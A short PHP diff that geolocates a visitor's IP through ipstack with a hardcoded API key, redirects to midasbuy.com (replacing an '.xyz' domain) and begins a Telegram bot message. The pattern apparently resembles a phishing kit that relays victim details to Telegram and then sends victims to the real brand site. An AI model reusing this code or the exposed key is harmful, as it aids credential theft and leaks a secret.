@@ -42,7 +42,7 @@ $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
-$url1 = "https://www.koc3hy.xyz";
+$url1 = "https://www.midasbuy.com";
 header("location: $url1");
 $name = $message->from->first_name;
 bot("sendMessage",[
